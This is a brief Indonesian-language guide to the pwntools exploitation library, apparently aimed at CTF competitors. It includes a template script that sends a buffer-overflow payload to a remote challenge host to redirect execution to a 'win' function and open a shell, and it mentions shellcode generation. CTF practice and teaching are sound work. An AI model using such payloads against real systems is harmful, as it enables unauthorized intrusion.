# pwntools Detail Guide
> Library Python paling populer untuk mempermudah pembuatan script exploit.

## Template Dasar Exploit
```python
from pwn import *

# Konfigurasi target
context.binary = exe = ELF('./challenge')
io = remote('target.gemastik.id', 9999) # atau process('./challenge')

# Membuat payload
offset = 40
payload = flat(
    b"A" * offset,
    exe.symbols['win_function']
)

# Mengirim payload
io.sendlineafter(b"Enter input: ", payload)

# Mendapatkan shell interaktif
io.interactive()
```

## Fitur Utama
- **ELF Analysis:** `exe.symbols`, `exe.plt`, `exe.got`.
- **Packing/Unpacking:** `p64()`, `u64()`, `p32()`.
- **Cyclic Pattern:** `cyclic(100)` dan `cyclic_find(0x61616161)`.
- **Shellcraft:** `shellcraft.sh()` untuk generate shellcode otomatis.
